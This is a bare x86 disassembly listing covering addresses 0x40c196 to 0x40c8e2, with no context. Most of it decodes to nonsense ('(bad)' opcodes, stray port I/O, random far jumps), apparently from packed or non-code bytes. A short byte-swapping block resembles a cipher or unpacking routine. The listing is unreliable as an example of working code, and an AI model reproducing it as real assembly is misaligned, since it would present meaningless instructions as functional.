  40c196:	jne    0x40c144
  40c198:	sub    BYTE PTR [eax],cl
  40c19a:	and    DWORD PTR [edi+0x77357f23],edx
  40c1a0:	stos   DWORD PTR es:[edi],eax
  40c1a1:	fs adc al,dl
  40c1a4:	add    eax,0x4473a6ee
  40c1a9:	jbe    0x40c147
  40c1ab:	in     eax,0x79
  40c1ad:	aaa    
  40c1ae:	(bad)  
  40c1af:	call   0xc2190a61
  40c1b4:	out    0x94,eax
  40c1b6:	add    bh,BYTE PTR [eax-0xecc935c]
  40c1bc:	out    dx,al
  40c1bd:	inc    edx
  40c1be:	lods   al,BYTE PTR ds:[esi]
  40c1bf:	adc    DWORD PTR [esp+eiz*2],ebx
  40c1c2:	mov    DWORD PTR [ebp+eax*8+0x11],ecx
  40c1c6:	hlt    
  40c1c7:	outs   dx,DWORD PTR ds:[esi]
  40c1c8:	mov    WORD PTR [ecx+esi*4-0x4298147d],?
  40c1cf:	add    bl,BYTE PTR ds:0xe44b067a
  40c1d5:	jo     0x40c1e0
  40c1d7:	in     al,dx
  40c1d8:	mov    es,edx
  40c1da:	push   eax
  40c1db:	sub    eax,0x50ac3668
  40c1e0:	add    eax,0xf435087e
  40c1e5:	clc    
  40c1e6:	into   
  40c1e7:	mov    bl,0x89
  40c1e9:	out    0xae,eax
  40c1eb:	mov    bh,0x25
  40c1ed:	xor    dl,BYTE PTR [edi+0x63]
  40c1f0:	or     bh,BYTE PTR ds:0xa9289748
  40c1f6:	sub    eax,0x888cec5c
  40c1fb:	pop    ebx
  40c1fc:	scas   al,BYTE PTR es:[edi]
  40c1fd:	mov    WORD PTR [ecx+0x48],fs
  40c200:	in     al,dx
  40c201:	push   eax
  40c202:	jl     0x40c1dd
  40c204:	and    esp,DWORD PTR [ecx+0x1f890757]
  40c20a:	push   ss
  40c20b:	inc    ebp
  40c20c:	mov    edx,0xd27f0c40
  40c211:	push   esp
  40c212:	fs adc bl,BYTE PTR ss:[ecx]
  40c216:	dec    DWORD PTR [eax-0x7c86553b]
  40c21c:	pop    ebx
  40c21d:	sub    al,0x52
  40c21f:	bound  edi,QWORD PTR [edi+0x3e6dcb41]
  40c225:	out    0xed,eax
  40c227:	mov    BYTE PTR [esi+0x22a74987],bh
  40c22d:	stc    
  40c22e:	mov    dh,0x61
  40c230:	sub    DWORD PTR [eax-0x78eb6447],ebp
  40c236:	pop    ecx
  40c237:	(bad)  
  40c238:	jmp    0x40c1fc
  40c23a:	cmp    al,0xd9
  40c23c:	pusha  
  40c23d:	je     0x40c22b
  40c23f:	or     al,0x2d
  40c241:	cmp    DWORD PTR gs:[ecx-0x71560cd1],ebx
  40c248:	push   0xea483e01
  40c24d:	inc    esp
  40c24e:	mov    bl,bh
  40c250:	pop    ecx
  40c251:	mov    ch,0x25
  40c253:	leave  
  40c254:	enter  0x29fe,0x7b
  40c258:	fistp  QWORD PTR [ecx-0x4f5378c9]
  40c25e:	and    cl,cl
  40c260:	add    ecx,DWORD PTR [ecx]
  40c262:	and    al,0xc4
  40c264:	pop    ebx
  40c265:	fidiv  DWORD PTR [ebp+edx*4-0x22cf3a5a]
  40c26c:	mov    cl,0xfa
  40c26e:	mov    ?,WORD PTR [ebx-0x47]
  40c271:	push   ecx
  40c272:	adc    eax,0xdc430710
  40c277:	jns    0x40c22c
  40c279:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c27a:	push   0x34c040a4
  40c27f:	loope  0x40c262
  40c281:	push   cs
  40c282:	push   edx
  40c283:	cmp    esp,eax
  40c285:	sti    
  40c286:	repnz rcr esp,cl
  40c289:	mov    al,ds:0x6c03684f
  40c28e:	mov    bh,0xf9
  40c290:	out    0x0,al
  40c292:	mov    eax,0xf871424c
  40c297:	nop
  40c298:	sar    ebp,1
  40c29a:	mov    DWORD PTR [edi+0x665d058b],edi
  40c2a0:	pop    ds
  40c2a1:	inc    ecx
  40c2a2:	std    
  40c2a3:	shl    DWORD PTR ds:0xb18502b,1
  40c2a9:	retf   
  40c2aa:	adc    al,0xfa
  40c2ac:	ror    BYTE PTR [eax],1
  40c2ae:	rol    DWORD PTR [edx],1
  40c2b0:	scas   al,BYTE PTR es:[edi]
  40c2b1:	mov    WORD PTR [edx+0x7d2412b6],es
  40c2b7:	or     DWORD PTR [edx-0xe00b6eb],edx
  40c2bd:	jg     0x40c250
  40c2bf:	mov    esp,0x936ae9ad
  40c2c4:	xor    eax,0x67adb83c
  40c2c9:	push   0xa4d99c09
  40c2ce:	repnz dec ebp
  40c2d0:	mov    ebx,0x5356d32d
  40c2d5:	fcom   QWORD PTR [esi+0x31d7df77]
  40c2db:	fnstsw WORD PTR ds:0xca5420b0
  40c2e1:	jb     0x40c2cc
  40c2e3:	call   0x516a5361
  40c2e8:	push   es
  40c2e9:	mov    al,0x67
  40c2eb:	lds    ecx,FWORD PTR [edx-0x2f1e5620]
  40c2f1:	loopne 0x40c35b
  40c2f3:	stos   DWORD PTR es:[edi],eax
  40c2f4:	loopne 0x40c281
  40c2f6:	(bad)  
  40c2f7:	mul    DWORD PTR [edi+0x28]
  40c2fa:	mov    bh,0x90
  40c2fc:	ds in  al,dx
  40c2fe:	pop    ecx
  40c2ff:	fdiv   st,st(1)
  40c301:	popa   
  40c302:	std    
  40c303:	mov    al,0xd2
  40c305:	dec    esp
  40c306:	add    eax,0xcabd1776
  40c30b:	jae    0x40c35e
  40c30d:	aad    0x8b
  40c30f:	xchg   DWORD PTR [ebp-0x33],ebx
  40c312:	push   eax
  40c313:	cwde   
  40c314:	pop    ss
  40c315:	sbb    bh,BYTE PTR [ecx+0x32]
  40c318:	jecxz  0x40c2d0
  40c31a:	push   ebp
  40c31b:	imul   eax,DWORD PTR [edx-0x33],0xffffffd5
  40c31f:	ja     0x40c38a
  40c321:	sbb    BYTE PTR [esi-0x53],bh
  40c324:	xchg   esi,eax
  40c325:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c326:	pop    edx
  40c327:	out    dx,eax
  40c328:	fldpi  
  40c32a:	cld    
  40c32b:	dec    ebx
  40c32c:	push   ebp
  40c32d:	loope  0x40c399
  40c32f:	or     esp,0xffffff9a
  40c332:	xchg   edi,eax
  40c333:	in     eax,0x93
  40c335:	xor    eax,0xbe99feb7
  40c33a:	xchg   edi,eax
  40c33b:	lods   al,BYTE PTR ds:[esi]
  40c33d:	mov    cl,0x97
  40c33f:	cli    
  40c340:	and    DWORD PTR [ecx],edx
  40c342:	mov    BYTE PTR [eax+0x33],ch
  40c345:	mov    dl,0xa
  40c347:	sub    ebp,DWORD PTR [ebp+0x4f]
  40c34a:	mov    BYTE PTR [ecx],0xff
  40c34d:	fcomp  QWORD PTR [ebx+0x48]
  40c350:	pop    ebx
  40c351:	xchg   DWORD PTR [ecx+ebp*4-0x69],ebx
  40c355:	cmp    esp,DWORD PTR [ecx+0x1c]
  40c358:	xchg   edx,eax
  40c359:	arpl   WORD PTR [ecx-0x74],dx
  40c35c:	push   es
  40c35d:	pop    ebp
  40c35e:	xchg   DWORD PTR [edi-0x1b],edx
  40c361:	add    al,0xbb
  40c363:	je     0x40c399
  40c365:	shr    BYTE PTR [edi+0x75],1
  40c368:	xchg   ebp,eax
  40c369:	(bad)  
  40c36a:	and    BYTE PTR [ecx],bl
  40c36c:	xchg   edx,eax
  40c36d:	push   ebp
  40c36e:	sbb    al,0x5a
  40c370:	sbb    BYTE PTR [ebx+0x48815cb4],0x8f
  40c377:	repnz mov ds:0x483af183,al
  40c37d:	nop    DWORD PTR [eax+0x5175d213]
  40c384:	jmp    0x40c3d0
  40c386:	adc    DWORD PTR [esi],0x7
  40c389:	xlat   BYTE PTR ds:[ebx]
  40c38a:	call   0x58bb:0x245c2b4a
  40c391:	mov    ecx,0xb477229b
  40c396:	cmp    eax,0xed8e94aa
  40c39b:	push   ss
  40c39c:	arpl   WORD PTR [eax-0x50],dx
  40c39f:	les    ebx,FWORD PTR [esi]
  40c3a1:	lds    ecx,FWORD PTR [ebp-0x69]
  40c3a4:	or     bl,BYTE PTR [ebx+0x3c]
  40c3a7:	sbb    esp,esp
  40c3a9:	push   edi
  40c3aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3ab:	jmp    0x8c273c76
  40c3b0:	push   ebx
  40c3b1:	mov    esp,0xdbd63f21
  40c3b6:	lock pushf 
  40c3b8:	loopne 0x40c364
  40c3ba:	cmc    
  40c3bb:	jg     0x40c3c0
  40c3bd:	rcr    BYTE PTR [ebx-0x4fb63369],1
  40c3c3:	imul   edi,DWORD PTR ds:0xdfe68e6f,0x6c
  40c3ca:	in     eax,0xd
  40c3cc:	outs   dx,BYTE PTR ds:[esi]
  40c3cd:	adc    dh,cl
  40c3cf:	ins    DWORD PTR es:[edi],dx
  40c3d0:	scas   eax,DWORD PTR es:[edi]
  40c3d1:	ficom  WORD PTR [edx+edi*1-0x56]
  40c3d5:	(bad)  
  40c3d7:	mul    DWORD PTR [edx+edx*8-0x5f22abc8]
  40c3de:	iret   
  40c3df:	mov    DWORD PTR ss:[ebx],ebp
  40c3e2:	test   dh,dl
  40c3e4:	sub    DWORD PTR [ebx+0x45],eax
  40c3e7:	mov    esi,0xe61a06ee
  40c3ec:	mov    esp,0x916fb2f8
  40c3f1:	sahf   
  40c3f2:	test   al,0x92
  40c3f4:	dec    esp
  40c3f5:	and    al,0xb3
  40c3f7:	push   cs
  40c3f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3fa:	les    ecx,FWORD PTR [edi+ebp*2+0x7aa26de5]
  40c401:	pop    ds
  40c402:	xor    bl,cl
  40c404:	pop    ebx
  40c405:	xchg   esi,eax
  40c406:	jmp    0xb825:0x4a5ad781
  40c40d:	cli    
  40c40e:	xchg   si,ax
  40c410:	xchg   ebp,eax
  40c411:	add    eax,0x15a2f140
  40c416:	adc    esp,DWORD PTR [ecx+0x5023ef6b]
  40c41c:	pop    esp
  40c41d:	out    0x65,al
  40c41f:	xor    ch,BYTE PTR [ecx+0x303af538]
  40c425:	int3   
  40c426:	pop    ebp
  40c427:	enter  0x19b7,0x28
  40c42b:	ins    BYTE PTR es:[edi],dx
  40c42c:	cwde   
  40c42d:	scas   al,BYTE PTR es:[edi]
  40c42e:	jb     0x40c400
  40c430:	retf   0xeeda
  40c433:	stos   DWORD PTR es:[edi],eax
  40c434:	dec    ebp
  40c435:	dec    edi
  40c436:	mov    ds:0x5acc016b,eax
  40c43b:	or     al,0x66
  40c43d:	popf   
  40c43e:	ins    BYTE PTR es:[edi],dx
  40c43f:	jle    0x40c455
  40c441:	mov    bl,0xcd
  40c443:	jo     0x40c42c
  40c445:	aaa    
  40c446:	mov    al,ds:0x199a05f
  40c44b:	add    esi,DWORD PTR [edx+0x16]
  40c44e:	mov    al,ds:0x6202eb3
  40c453:	sbb    al,0x26
  40c455:	dec    edx
  40c456:	jg     0x40c3f3
  40c458:	sub    edx,edx
  40c45a:	(bad)  
  40c45b:	sar    BYTE PTR ds:0x35bda09,0x9b
  40c462:	xchg   esp,eax
  40c463:	in     eax,dx
  40c464:	xchg   ch,ch
  40c466:	cmp    al,0x69
  40c468:	(bad)  
  40c469:	xchg   esi,eax
  40c46a:	out    dx,eax
  40c46b:	xchg   BYTE PTR [edx+0x5],bh
  40c46e:	or     al,bl
  40c470:	ins    DWORD PTR es:[edi],dx
  40c471:	mov    ebx,0xb3a67b27
  40c476:	jge    0x40c454
  40c478:	loopne 0x40c409
  40c47a:	mov    DWORD PTR [edx-0x3e],ebx
  40c47d:	(bad)  
  40c47e:	mov    edx,0x1a3f0f19
  40c483:	dec    ebx
  40c484:	bound  ebp,QWORD PTR [edi-0x44]
  40c487:	je     0x40c42c
  40c489:	dec    edx
  40c48a:	mov    al,ds:0xca85985f
  40c48f:	pop    esi
  40c490:	xchg   ebp,eax
  40c491:	loope  0x40c42c
  40c493:	pop    ecx
  40c494:	pusha  
  40c495:	cmp    eax,DWORD PTR [ebx]
  40c497:	mov    ah,0xfe
  40c499:	pop    ds
  40c49a:	mov    ebx,0xad4d1651
  40c49f:	mov    al,0x6f
  40c4a1:	xor    BYTE PTR [edx+0x2cb13eb5],0xce
  40c4a8:	xor    dh,BYTE PTR [edx-0x45]
  40c4ab:	and    cl,BYTE PTR [edi+0x1ea538e]
  40c4b1:	outs   dx,DWORD PTR ds:[esi]
  40c4b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4b3:	pop    ds
  40c4b4:	jle    0x40c52a
  40c4b6:	push   0x44c94858
  40c4bb:	lods   al,BYTE PTR ds:[esi]
  40c4bc:	sub    eax,0x78c8f694
  40c4c1:	inc    eax
  40c4c2:	fs popa 
  40c4c4:	aam    0x64
  40c4c6:	repnz xor BYTE PTR [edi],cl
  40c4c9:	adc    DWORD PTR [esi],ecx
  40c4cb:	sub    edi,DWORD PTR [edx]
  40c4cd:	jae    0x40c4b2
  40c4cf:	cmp    eax,0x2994ab37
  40c4d4:	fs std 
  40c4d6:	adc    al,0x88
  40c4d8:	f2xm1  
  40c4da:	xchg   esi,eax
  40c4db:	dec    ebp
  40c4dc:	xlat   BYTE PTR ds:[ebx]
  40c4dd:	in     al,dx
  40c4de:	push   edi
  40c4df:	mov    edi,0x6d156515
  40c4e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4e5:	cmp    dh,bh
  40c4e7:	dec    ebp
  40c4e8:	pop    esi
  40c4e9:	inc    edi
  40c4ea:	add    edi,eax
  40c4ec:	aad    0x16
  40c4ee:	out    dx,al
  40c4ef:	out    0x33,eax
  40c4f1:	rol    BYTE PTR [ebx],1
  40c4f3:	push   ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	pop    eax
  40c541:	clc    
  40c542:	imul   esp,DWORD PTR [ebx],0x4d
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c553
  40c54d:	jns    0x40c53c
  40c54f:	push   esp
  40c550:	xchg   edx,eax
  40c551:	xor    DWORD PTR [ebp+0x4b],eax
  40c554:	stos   DWORD PTR es:[edi],eax
  40c555:	dec    ebx
  40c556:	ret    
  40c557:	add    BYTE PTR [edx],dh
  40c559:	adc    ecx,DWORD PTR [edi]
  40c55b:	(bad)  
  40c55c:	ret    0x350c
  40c55f:	cli    
  40c560:	loope  0x40c5a2
  40c562:	adc    eax,ecx
  40c564:	clc    
  40c565:	gs enter 0xfde9,0xd1
  40c56a:	fdivr  st(6),st
  40c56c:	mov    BYTE PTR [edx-0x4e],dh
  40c56f:	clc    
  40c570:	jp     0x40c58f
  40c572:	ret    
  40c573:	pusha  
  40c574:	(bad)  
  40c575:	ds mov dh,dl
  40c578:	xchg   edi,eax
  40c579:	or     al,0x3e
  40c57b:	in     eax,dx
  40c57c:	adc    ah,BYTE PTR [ecx]
  40c57e:	cmp    BYTE PTR [edi+0x1de18267],al
  40c584:	lods   eax,DWORD PTR ds:[esi]
  40c585:	outs   dx,BYTE PTR ds:[esi]
  40c586:	(bad)  
  40c587:	mul    BYTE PTR [ecx+ebx*2]
  40c58a:	(bad)  
  40c58b:	push   0xffffff88
  40c58d:	xchg   ebx,eax
  40c58e:	push   esp
  40c58f:	ins    BYTE PTR es:[edi],dx
  40c590:	repnz mov esi,0x7c843ed5
  40c596:	pop    ebp
  40c597:	xchg   ebx,eax
  40c598:	pop    es
  40c599:	pushf  
  40c59a:	jbe    0x40c5ec
  40c59c:	mov    ecx,0xdc81021c
  40c5a1:	je     0x40c531
  40c5a3:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40c5a5:	mov    dh,0x31
  40c5a7:	jmp    0x9cdd9c4a
  40c5ac:	xchg   DWORD PTR ds:0xaf6baaf2,ebp
  40c5b2:	cld    
  40c5b3:	shl    BYTE PTR [eax],cl
  40c5b5:	pop    ss
  40c5b6:	rcr    bl,cl
  40c5b8:	pusha  
  40c5b9:	icebp  
  40c5ba:	lahf   
  40c5bb:	cmp    esi,ebx
  40c5bd:	daa    
  40c5be:	xlat   BYTE PTR ds:[ebx]
  40c5bf:	push   esp
  40c5c0:	imul   eax,DWORD PTR [edi+eiz*8+0x6f81f0b1],0xf
  40c5c8:	nop
  40c5c9:	sbb    esp,esp
  40c5cb:	mov    al,al
  40c5cd:	out    0x16,al
  40c5cf:	sub    DWORD PTR [ebx-0xbd315ad],esi
  40c5d5:	aad    0x26
  40c5d7:	cli    
  40c5d8:	dec    esi
  40c5d9:	aas    
  40c5da:	andps  xmm0,XMMWORD PTR ss:[edx+0x22c629c9]
  40c5e2:	in     al,0xca
  40c5e4:	aas    
  40c5e5:	jb     0x40c59e
  40c5e7:	or     edx,DWORD PTR [esi]
  40c5e9:	retf   0x77ba
  40c5ec:	jmp    0x40c5b0
  40c5ee:	add    ah,BYTE PTR [ebp+0x16]
  40c5f1:	dec    edx
  40c5f2:	pop    esi
  40c5f3:	mov    ds:0xe272bafa,al
  40c5f8:	xchg   edx,eax
  40c5f9:	add    BYTE PTR [eax],bl
  40c5fb:	arpl   bx,ax
  40c5fd:	ja     0x40c666
  40c5ff:	xchg   ebp,eax
  40c600:	repz mov ebp,0xfb144cda
  40c606:	sub    ah,BYTE PTR [edi+0x176902b7]
  40c60c:	sbb    eax,0x7052c10e
  40c611:	xlat   BYTE PTR ds:[ebx]
  40c612:	mov    al,0xc2
  40c614:	mov    edi,DWORD PTR [esi]
  40c616:	mov    bl,0xab
  40c618:	dec    eax
  40c619:	mov    bl,0x62
  40c61b:	sbb    BYTE PTR ds:0xa7d8bccb,cl
  40c621:	pop    edx
  40c622:	ins    BYTE PTR es:[edi],dx
  40c623:	stos   BYTE PTR es:[edi],al
  40c624:	jne    0x40c5bc
  40c626:	push   cs
  40c627:	fldcw  WORD PTR [ecx-0x74c5f112]
  40c62d:	fadd   QWORD PTR [edi-0x7bf23b4b]
  40c633:	pop    edi
  40c634:	pop    ds
  40c635:	cmc    
  40c636:	xchg   esi,eax
  40c637:	sbb    dl,BYTE PTR [edx-0x7842cb3d]
  40c63d:	xor    esp,eax
  40c63f:	pop    eax
  40c640:	pop    ebp
  40c641:	out    0xcf,eax
  40c643:	and    eax,0x82b0f746
  40c648:	xor    eax,0x6029020a
  40c64d:	add    BYTE PTR [edi+0x30],cl
  40c650:	xchg   esi,eax
  40c651:	in     al,dx
  40c652:	adc    bh,BYTE PTR [eax]
  40c654:	js     0x40c607
  40c656:	adc    eax,0xd73d5e58
  40c65b:	inc    ebx
  40c65c:	cmp    eax,DWORD PTR [esp+ecx*1-0x6d044df3]
  40c663:	or     DWORD PTR [edx],edi
  40c665:	popf   
  40c666:	jmp    0x466c387c
  40c66b:	jo     0x40c696
  40c66d:	int3   
  40c66e:	inc    esp
  40c66f:	fiadd  DWORD PTR [ebx-0x2c]
  40c672:	sbb    dh,BYTE PTR [edi]
  40c674:	int    0xed
  40c676:	scas   eax,DWORD PTR es:[edi]
  40c677:	mov    esp,ds
  40c679:	outs   dx,DWORD PTR ds:[esi]
  40c67a:	out    dx,eax
  40c67b:	xor    esi,esi
  40c67d:	mov    eax,ds:0xcb03e3ba
  40c682:	cmp    DWORD PTR [ecx-0x6ec97216],ebp
  40c688:	imul   eax,DWORD PTR [esp+edx*1-0x7],0x61
  40c68d:	jnp    0x40c620
  40c68f:	call   0x88141a5a
  40c694:	imul   eax,DWORD PTR ds:0xb82154d1,0x2a055031
  40c69e:	sbb    ebx,DWORD PTR [eax+0x5a]
  40c6a1:	shl    DWORD PTR [edx],1
  40c6a3:	cld    
  40c6a4:	push   eax
  40c6a5:	xchg   edi,eax
  40c6a6:	pushf  
  40c6a7:	mov    WORD PTR [eax+0x15eaf0b3],ds
  40c6ad:	push   0x5022ebcb
  40c6b2:	pop    ss
  40c6b3:	sbb    bl,BYTE PTR [esi]
  40c6b5:	add    ch,bl
  40c6b7:	jnp    0x40c6a4
  40c6b9:	js     0x40c6db
  40c6bb:	mov    ebx,0x667413fd
  40c6c0:	and    al,0x87
  40c6c2:	mov    ch,0xfd
  40c6c4:	mov    al,0xd5
  40c6c6:	mov    eax,ds:0x557cd8fe
  40c6cb:	fnstcw WORD PTR [ebp-0x16]
  40c6ce:	fwait
  40c6cf:	mov    al,ds:0x4f6bed70
  40c6d4:	outs   dx,DWORD PTR ds:[esi]
  40c6d5:	or     al,0x33
  40c6d7:	sub    al,bh
  40c6d9:	sysexit 
  40c6db:	jle    0x40c726
  40c6dd:	mov    eax,0x56a64703
  40c6e2:	inc    edi
  40c6e3:	int    0x6
  40c6e5:	test   al,0xe4
  40c6e7:	inc    esi
  40c6e8:	dec    edx
  40c6e9:	gs pop ebx
  40c6eb:	jle    0x40c728
  40c6ed:	test   al,0x66
  40c6ef:	stc    
  40c6f0:	and    eax,0xa3f87e4f
  40c6f5:	adc    DWORD PTR [esi],ebx
  40c6f7:	pop    ecx
  40c6f8:	(bad)  
  40c6f9:	pop    ss
  40c6fa:	mov    dh,0xc8
  40c6fc:	cdq    
  40c6fd:	es push ebp
  40c6ff:	repnz pop ecx
  40c701:	or     DWORD PTR [esi],edx
  40c703:	xchg   edi,eax
  40c704:	lods   al,BYTE PTR ds:[esi]
  40c705:	adc    eax,0x294d71c0
  40c70a:	cli    
  40c70b:	cmc    
  40c70c:	jno    0x40c6c5
  40c70e:	mov    ch,0xcd
  40c710:	mov    BYTE PTR [esi],dl
  40c712:	mov    cl,BYTE PTR [esi+0x27a64497]
  40c718:	mov    edi,0x6f6978b6
  40c71d:	mov    cl,0xfe
  40c71f:	cmp    al,0xf0
  40c721:	jecxz  0x40c6ee
  40c723:	hlt    
  40c724:	sti    
  40c725:	adc    eax,DWORD PTR [ecx]
  40c727:	push   ebx
  40c728:	inc    ecx
  40c729:	mov    ebp,0xba0290b5
  40c72e:	pop    edx
  40c72f:	in     eax,0xef
  40c731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c732:	cmp    al,0x9c
  40c734:	inc    dl
  40c736:	pop    es
  40c737:	push   ecx
  40c738:	xchg   esi,eax
  40c739:	pop    DWORD PTR [ebp+0x2e]
  40c73c:	retf   0x5a3d
  40c73f:	pop    ss
  40c740:	adc    al,0xb0
  40c742:	jnp    0x40c7a8
  40c744:	enter  0x7a5,0xc7
  40c748:	or     edx,DWORD PTR [ebx+0x74]
  40c74b:	adc    DWORD PTR [esi-0x1e],edi
  40c74e:	dec    ecx
  40c74f:	fucomp st(0)
  40c751:	xchg   edi,eax
  40c752:	xchg   esp,eax
  40c753:	sub    edi,DWORD PTR [edi+0xb2634ce]
  40c759:	test   eax,0xeb40434c
  40c75e:	cmp    ah,ah
  40c760:	sahf   
  40c761:	gs call 0x6680ae20
  40c767:	push   ss
  40c768:	fs inc ebx
  40c76a:	add    bh,al
  40c76c:	call   0xa9e79faf
  40c771:	fs ja  0x40c7a5
  40c774:	aas    
  40c775:	das    
  40c776:	xchg   edi,eax
  40c777:	jne    0x40c767
  40c779:	cmp    esp,DWORD PTR [edi+0x61]
  40c77c:	pop    es
  40c77d:	mov    ah,0xce
  40c77f:	pop    ds
  40c780:	(bad)  
  40c781:	fcmovnbe st,st(0)
  40c783:	sbb    al,dh
  40c785:	neg    ebp
  40c787:	fild   DWORD PTR [edi-0x5c]
  40c78a:	sub    al,0x29
  40c78c:	leave  
  40c78d:	ds mov dl,0xdd
  40c790:	and    esp,DWORD PTR [edi]
  40c792:	inc    esi
  40c793:	cmp    BYTE PTR [ecx-0x4bf3e896],dh
  40c799:	in     al,0xe1
  40c79b:	out    0x5c,eax
  40c79d:	pusha  
  40c79e:	push   0xffffffa9
  40c7a0:	out    0x23,eax
  40c7a2:	adc    cl,BYTE PTR [eax-0x607cc946]
  40c7a8:	popf   
  40c7a9:	sub    al,0x3a
  40c7ab:	mov    al,ds:0xb1054963
  40c7b0:	and    edi,esi
  40c7b2:	lahf   
  40c7b3:	cdq    
  40c7b4:	daa    
  40c7b5:	mov    cl,0xbf
  40c7b7:	sti    
  40c7b8:	cmp    eax,0xf1df9647
  40c7bd:	xchg   esi,eax
  40c7be:	xor    DWORD PTR [eax-0x30],esp
  40c7c1:	xchg   esp,eax
  40c7c2:	xchg   esi,eax
  40c7c3:	jae    0x40c80b
  40c7c5:	xchg   ecx,eax
  40c7c6:	cmp    eax,DWORD PTR [ecx]
  40c7c8:	ficomp DWORD PTR [esp+eax*1-0x663f785f]
  40c7cf:	push   ecx
  40c7d0:	ror    BYTE PTR [ebx-0x6d],cl
  40c7d3:	cdq    
  40c7d4:	retf   0x1455
  40c7d7:	mov    edx,0x309e0b5
  40c7dc:	test   DWORD PTR ds:0xd033d34a,esi
  40c7e2:	ror    dh,1
  40c7e4:	cld    
  40c7e5:	push   edx
  40c7e6:	int3   
  40c7e7:	jle    0x40c7d2
  40c7e9:	jmp    0x40d7:0xf406ff13
  40c7f0:	xor    eax,0x5be67dac
  40c7f5:	and    DWORD PTR ds:0xf081b80f,ecx
  40c7fb:	mov    ds:0x465b270b,al
  40c800:	xchg   esi,eax
  40c801:	xchg   ebx,eax
  40c802:	sub    DWORD PTR [edx+0x5efe9fa8],edx
  40c808:	jns    0x40c805
  40c80a:	cmp    edi,DWORD PTR [edi-0x9]
  40c80d:	inc    esi
  40c80e:	rol    BYTE PTR fs:[esi],1
  40c811:	sbb    bh,al
  40c813:	or     cl,0x78
  40c816:	in     eax,0x18
  40c818:	add    DWORD PTR [ebp-0x7e],eax
  40c81b:	pop    edx
  40c81c:	daa    
  40c81d:	lds    esi,FWORD PTR [ebx-0x15]
  40c820:	jecxz  0x40c81d
  40c822:	sub    BYTE PTR [ebp+0x6c9b9f61],bl
  40c828:	ds aas 
  40c82a:	test   BYTE PTR [ebp-0x2125dd43],bl
  40c830:	hlt    
  40c831:	es popa 
  40c833:	and    eax,0xf6daf6ba
  40c838:	pop    ss
  40c839:	push   0x6f
  40c83b:	shl    BYTE PTR [ebp+0x34bd70bf],1
  40c841:	adc    dh,BYTE PTR [ebp+eax*4+0x9068069]
  40c848:	outs   dx,DWORD PTR ds:[esi]
  40c849:	faddp  st(2),st
  40c84b:	mov    ecx,edi
  40c84d:	sbb    ch,BYTE PTR [edx+ecx*8]
  40c850:	dec    edi
  40c851:	cmp    eax,0x6457fcfd
  40c856:	(bad)  
  40c857:	mov    ebx,0x25ce5c53
  40c85c:	dec    ebp
  40c85d:	jl     0x40c879
  40c85f:	pop    ebp
  40c860:	push   ecx
  40c861:	pusha  
  40c862:	jne    0x40c83e
  40c864:	aam    0xd6
  40c866:	mov    al,0x61
  40c868:	xchg   DWORD PTR [edi+0x1c20c1a6],edi
  40c86e:	jbe    0x40c8da
  40c870:	mov    dl,0x20
  40c872:	adc    eax,0x4f6c575d
  40c877:	mov    cs,WORD PTR [edi+0x56]
  40c87a:	jmp    0x40c8f7
  40c87c:	icebp  
  40c87d:	shl    BYTE PTR [esi-0x6869db51],cl
  40c883:	dec    esp
  40c884:	push   0x82a4ec25
  40c889:	mov    ecx,0xff9e6bd3
  40c88e:	sbb    al,0xd1
  40c890:	ja     0x40c889
  40c892:	ins    DWORD PTR es:[edi],dx
  40c893:	or     eax,0x99d726a0
  40c898:	xlat   BYTE PTR ds:[ebx]
  40c899:	pusha  
  40c89a:	addr16 lahf 
  40c89c:	mov    dh,0x4e
  40c89e:	outs   dx,DWORD PTR ds:[esi]
  40c89f:	jb     0x40c8e0
  40c8a1:	add    BYTE PTR es:[ebx-0x53],ch
  40c8a5:	fstp   QWORD PTR [ebp+0x31]
  40c8a8:	dec    edx
  40c8a9:	loopne 0x40c8b4
  40c8ab:	push   0xde7e035d
  40c8b0:	adc    cl,BYTE PTR [ebp+0x704245f7]
  40c8b6:	jmp    0x40c8f3
  40c8b8:	retf   
  40c8b9:	test   DWORD PTR [eax+0xf],edi
  40c8bc:	mov    ?,esi
  40c8be:	xchg   ecx,eax
  40c8bf:	sbb    BYTE PTR [edi+ebx*4+0x715cc93f],cl
  40c8c6:	repz xchg esi,eax
  40c8c8:	add    ebx,DWORD PTR [edx]
  40c8ca:	jno    0x40c8be
  40c8cc:	imul   esi,ebp,0x3a
  40c8cf:	icebp  
  40c8d0:	inc    DWORD PTR [edi]
  40c8d2:	fadd   DWORD PTR [edi]
  40c8d4:	adc    dh,BYTE PTR [esi+ecx*1]
  40c8d7:	stos   DWORD PTR es:[edi],eax
  40c8d8:	setne  BYTE PTR ds:0x3c2ca14a
  40c8df:	dec    ecx
  40c8e0:	out    0x1c,eax
  40c8e2:	inc    eax
